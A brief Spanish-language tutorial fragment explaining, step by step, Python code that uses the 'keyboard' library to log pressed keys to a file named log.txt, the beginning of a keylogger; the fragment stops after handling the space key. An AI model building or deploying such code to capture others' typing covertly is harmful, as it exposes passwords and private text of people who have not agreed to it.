primeramente importamos la libreria : 
  import keyboard

Después declaramos una función para la detección de teclas :
  def precionar_teclas(teclas):

Para que detecte las teclas :
    with open("log.txt", "a") as archivo:

Cuando el usuario escriba la tecla space nos escriba un espacio :   
        if teclas.name == "space":
            archivo.write(" ")
